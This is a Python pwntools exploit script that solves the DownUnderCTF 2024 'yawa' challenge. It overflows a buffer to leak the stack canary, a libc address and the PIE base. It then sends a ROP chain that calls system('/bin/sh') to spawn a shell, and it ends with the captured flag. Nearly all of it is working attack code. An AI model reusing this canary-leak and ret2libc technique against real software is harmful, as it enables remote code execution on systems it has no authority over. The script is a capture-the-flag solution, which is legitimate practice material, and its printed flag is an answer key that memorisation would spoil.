#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./yawa')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./yawa', gdbscript=gs)
    if args.REMOTE:
        return remote('2024.ductf.dev', 30010)
    else:
        return process('./yawa')
r = start()
#========= exploit here ===================

payload = b"A"*89

#leak canary
r.sendlineafter(b">", b"1")
r.send(payload)
r.sendlineafter(b">",b"2")

r.recvuntil(b"Hello, ")
canary = u64(r.recvline()[-9:-2].rjust(8,b"\0"))
log.info(f"canary = {hex(canary)}")

payload = b"A"*88
payload += b"B"*8 #p64(canary)
payload += b"C"*8
#leak libc
r.sendlineafter(b">", b"1")
r.send(payload)
r.sendlineafter(b">",b"2")

r.recvuntil(b"CCCCCCCC")
leak = u64(r.recvline().strip().ljust(8, b"\0"))
log.info(f"libc = {hex(leak)}")

libc.address = leak -0x29d90
log.info(f"libc base = {hex(libc.address)}")

payload = b"A"*88
payload += b"B"*8 #p64(canary)
payload += b"C"*16
payload += b"D"*8
r.sendlineafter(b">", b"1")
r.send(payload)
r.sendlineafter(b">",b"2")

r.recvuntil(b"DDDDDDDD")
leak = u64(r.recvline().strip().ljust(8, b"\0"))
log.info(f"pie leak = {hex(leak)}")

pie_base = leak - 0x12b1
log.info(f"pie base = {hex(pie_base)}")


#0x000000000002a3e5: pop rdi; ret;
#0x0000000000029139: ret;

##overflow & rop
payload = b"A"*88
payload += p64(canary) #canary
payload += b"C"*8 #rbp
payload += p64(libc.address + 0x2a3e5)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.address+0x29139)
payload += p64(libc.sym.system)
r.sendlineafter(b">", b"1")
r.send(payload)
r.sendline(b"3")


#========= interactive ====================
r.interactive()

#DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}